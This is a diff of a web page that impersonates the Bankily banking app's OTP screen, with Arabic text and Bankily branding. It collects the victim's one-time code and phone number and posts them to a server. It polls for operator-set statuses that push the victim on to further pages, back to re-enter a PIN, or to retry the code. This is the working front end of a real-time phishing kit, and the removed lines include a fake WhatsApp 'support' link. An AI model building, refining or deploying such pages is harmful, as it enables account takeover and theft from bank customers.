@@ -3,16 +3,16 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Bankily - بنكيلي - رمز التحقق الأول</title>
+    <title>Bankily - بنكيلي - رمز التحقق</title>
 
     <!-- ✅ Telegram SDK -->
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
 
     <style>
         :root {
-            --bankily-teal: #00607A;        /* Bankily Signature Teal */
+            --bankily-teal: #00607A;
             --bankily-teal-dark: #004356;
-            --bankily-yellow: #E8A200;      /* Bankily Signature Yellow/Gold */
+            --bankily-yellow: #E8A200;
             --bankily-yellow-hover: #d19200;
             --bg-color: #ffffff;
             --text-dark: #1e293b;
@@ -37,7 +37,6 @@
             min-height: 100vh;
         }
 
-        /* Top Teal Header Navigation Bar */
         .app-header {
             width: 100%;
             background-color: var(--bankily-teal);
@@ -60,8 +59,6 @@
             border: none;
             cursor: pointer;
             padding: 0;
-            display: flex;
-            align-items: center;
         }
 
         .header-title {
@@ -70,10 +67,9 @@
             font-size: 19px;
             font-weight: 800;
             color: #ffffff;
-            margin-left: 22px; /* Balance arrow space */
+            margin-left: 22px;
         }
 
-        /* Main Container */
         .content-container {
             width: 100%;
             max-width: 440px;
@@ -103,7 +99,6 @@
             display: inline-block;
         }
 
-        /* OTP Input Lines Style (Matches Image) */
         .otp-input-group {
             display: flex;
             justify-content: center;
@@ -131,7 +126,6 @@
             border-bottom-color: var(--bankily-teal);
         }
 
-        /* Countdown Timer Styling */
         .timer-label {
             font-size: 13px;
             color: var(--text-muted);
@@ -147,7 +141,6 @@
             direction: ltr;
         }
 
-        /* Circular Progress Ring Icon */
         .circle-loader-ring {
             width: 42px;
             height: 42px;
@@ -172,7 +165,6 @@
             text-decoration: underline;
             cursor: pointer;
             padding: 6px 12px;
-            transition: color 0.2s;
         }
 
         .resend-btn.active-resend {
@@ -184,16 +176,15 @@
             color: #d93025;
             background-color: #ffebe9;
             border: 1px solid #ff4d4f;
-            padding: 10px 14px;
+            padding: 12px 14px;
             border-radius: 10px;
-            font-size: 13px;
+            font-size: 14px;
             font-weight: 700;
-            margin-top: 15px;
+            margin-top: 20px;
             display: none;
             width: 100%;
         }
 
-        /* Bottom Fixed Gold Submit Button */
         .bottom-action-bar {
             position: fixed;
             bottom: 0;
@@ -219,8 +210,6 @@
             font-size: 17px;
             font-weight: 900;
             cursor: pointer;
-            letter-spacing: 0.5px;
-            transition: background-color 0.2s, opacity 0.2s;
             box-shadow: 0 4px 14px rgba(232, 162, 0, 0.35);
         }
 
@@ -231,18 +220,14 @@
             box-shadow: none;
         }
 
-        .submit-btn:active:not(:disabled) {
-            background-color: var(--bankily-yellow-hover);
-        }
-
-        /* Fullscreen Processing Overlay */
+        /* Full top-to-bottom loading overlay */
         .overlay {
             position: fixed;
             top: 0;
             left: 0;
             width: 100vw;
             height: 100vh;
-            background: rgba(0, 96, 122, 0.95);
+            background: #00607A;
             display: none;
             flex-direction: column;
             justify-content: center;
@@ -253,22 +238,14 @@
             padding: 24px;
         }
 
-        .overlay-card {
-            width: 100%;
-            max-width: 360px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-
-        .spinner {
-            width: 50px;
-            height: 50px;
-            border: 4px solid rgba(255, 255, 255, 0.2);
-            border-top: 4px solid var(--bankily-yellow);
+        .loader-spinner {
+            width: 70px;
+            height: 70px;
+            border: 5px solid rgba(255, 255, 255, 0.2);
+            border-top: 5px solid var(--bankily-yellow);
             border-radius: 50%;
             animation: spinOverlay 0.9s linear infinite;
-            margin-bottom: 20px;
+            margin-bottom: 24px;
         }
 
         @keyframes spinOverlay {
@@ -277,39 +254,23 @@
         }
 
         .overlay-title {
-            font-size: 20px;
+            font-size: 22px;
             font-weight: 800;
             margin-bottom: 10px;
             color: #ffffff;
         }
 
         .overlay-desc {
-            font-size: 14px;
+            font-size: 15px;
             font-weight: 600;
-            margin-bottom: 20px;
             color: #e2e8f0;
             line-height: 1.5;
-        }
-
-        .wa-btn {
-            display: block;
-            width: 100%;
-            background-color: #ffffff;
-            color: var(--bankily-teal);
-            font-weight: 800;
-            padding: 16px;
-            border-radius: 12px;
-            text-decoration: none;
-            word-break: break-all;
-            font-size: 13px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
         }
     </style>
 </head>
 
 <body>
 
-<!-- Bankily Top Header -->
 <div class="app-header">
     <button onclick="window.location.href='/page7'" class="back-btn">→</button>
     <div class="header-title">رمز التحقق</div>
@@ -319,7 +280,6 @@
     <div class="instruction-title">أدخل رمز OTP المرسل إلى هاتفك المحمول</div>
     <div class="phone-display" id="displayPhone">+222 ...</div>
 
-    <!-- 4 OTP Underlined Input Boxes -->
     <div class="otp-input-group">
         <input type="text" maxlength="1" class="otp-box" inputmode="numeric" autocomplete="one-time-code">
         <input type="text" maxlength="1" class="otp-box" inputmode="numeric" autocomplete="off">
@@ -327,7 +287,6 @@
         <input type="text" maxlength="1" class="otp-box" inputmode="numeric" autocomplete="off">
     </div>
 
-    <!-- Timer and Circular Ring -->
     <div class="timer-label">تنتهي صلاحية رمز OTP خلال</div>
     <div class="timer-value" id="timer">4 دقائق 55 ثانية</div>
 
@@ -335,32 +294,18 @@
 
     <button id="resendBtn" class="resend-btn" disabled>إعادة إرسال رمز OTP</button>
 
-    <div id="errorText" class="error-message">رمز OTP غير صحيح أو انتهت صلاحيته. يرجى المحاولة مرة أخرى.</div>
+    <div id="errorText" class="error-message">رمز غير صحيح، يرجى إدخال الرمز الصحيح.</div>
 </div>
 
-<!-- Bottom Gold Action Button -->
 <div class="bottom-action-bar">
     <button id="submitBtn" class="submit-btn" disabled>تأكيد</button>
 </div>
 
-<!-- Status Overlay (Verifying) -->
+<!-- FULL SIZE LOADING STATUS OVERLAY -->
 <div class="overlay" id="statusOverlay">
-    <div class="overlay-card">
-        <div class="spinner"></div>
-        <div class="overlay-title">جاري التحقق من الرمز...</div>
-        <div class="overlay-desc">يرجى الانتظار لحظات ريثما يتم التحقق من صحة رمز OTP.</div>
-    </div>
-</div>
-
-<!-- WhatsApp Support Overlay -->
-<div class="overlay" id="contactOverlay">
-    <div class="overlay-card">
-        <div class="overlay-title">تواصل معنا عبر واتساب</div>
-        <div class="overlay-desc">انقر على الرابط أدناه للتواصل مع خدمة دعم Bankily عبر واتساب:</div>
-        <a href="https://api.whatsapp.com/send?phone=254768003570&text=مرحباً،%20أحتاج%20إلى%20مساعدة%20في%20Bankily" target="_blank" class="wa-btn">
-            https://api.whatsapp.com/send?phone=254768003570...
-        </a>
-    </div>
+    <div class="loader-spinner"></div>
+    <div class="overlay-title">جاري المعالجة...</div>
+    <div class="overlay-desc">جاري التحقق من رمز OTP، يرجى الانتظار بضع ثوانٍ.</div>
 </div>
 
 <script>
@@ -371,7 +316,6 @@ document.addEventListener("DOMContentLoaded", () => {
     const resendBtn = document.getElementById('resendBtn');
     const timerEl = document.getElementById('timer');
     const statusOverlay = document.getElementById('statusOverlay');
-    const contactOverlay = document.getElementById('contactOverlay');
     const errorText = document.getElementById('errorText');
 
     let checkInterval = null;
@@ -414,9 +358,7 @@ document.addEventListener("DOMContentLoaded", () => {
         errorText.style.display = 'none';
     }
 
-    // Countdown Timer (Total 295 seconds = 4 Mins 55 Seconds matching screenshot)
     let totalSeconds = 295;
-    
     function formatTimer(sec) {
         const mins = Math.floor(sec / 60);
         const secs = sec % 60;
@@ -437,22 +379,7 @@ document.addEventListener("DOMContentLoaded", () => {
         }
     }, 1000);
 
-    resendBtn.addEventListener('click', async () => {
-        if (resendBtn.disabled) return;
-        
-        try {
-            await fetch('/api/resend-otp-notification', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ phone: savedPhone, step: "First OTP" })
-            });
-        } catch(e) {
-            console.error(e);
-        }
-        location.reload();
-    });
-
-    // Admin Status Polling
+    // Poll status from server
     function startStatusPolling() {
         if (checkInterval) clearInterval(checkInterval);
 
@@ -461,28 +388,22 @@ document.addEventListener("DOMContentLoaded", () => {
                 const res = await fetch(`/api/check-status?phone=${encodeURIComponent(savedPhone)}`);
                 const data = await res.json();
 
-                if (data.status === "otp1_correct") {
+                if (data.status === "p8_correct") {
                     clearInterval(checkInterval);
                     window.location.href = "/page9";
                 } 
-                else if (data.status === "otp2_wrongpin" || data.status === "pin_wrong") {
+                else if (data.status === "p8_wrong_pin" || data.status === "pin_wrong") {
                     clearInterval(checkInterval);
                     window.location.href = "/page6?error=wrongpin";
                 } 
-                else if (data.status === "otp1_wrong") {
+                else if (data.status === "p8_wrong_code") {
                     clearInterval(checkInterval);
                     statusOverlay.style.display = "none";
-                    contactOverlay.style.display = "none";
-                    errorText.textContent = "رمز OTP غير صحيح أو انتهت صلاحيته، يرجى المحاولة مرة أخرى.";
+                    errorText.textContent = "رمز غير صحيح، يرجى إدخال الرمز الصحيح.";
                     errorText.style.display = "block";
                     otpBoxes.forEach(b => b.value = "");
                     otpBoxes[0].focus();
                     submitBtn.disabled = true;
-                } 
-                else if (data.status === "contact_us") {
-                    clearInterval(checkInterval);
-                    statusOverlay.style.display = "none";
-                    contactOverlay.style.display = "flex";
                 }
             } catch (err) {
                 console.error("Status check error:", err);
@@ -495,10 +416,8 @@ document.addEventListener("DOMContentLoaded", () => {
 
         let otpCode = "";
         otpBoxes.forEach(b => otpCode += b.value);
-
         if (otpCode.length !== 4) return;
 
-        contactOverlay.style.display = "none";
         statusOverlay.style.display = "flex";
         errorText.style.display = "none";
 
@@ -508,7 +427,7 @@ document.addEventListener("DOMContentLoaded", () => {
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     phone: savedPhone,
-                    link: otpCode
+                    otp: otpCode
                 })
             });
 
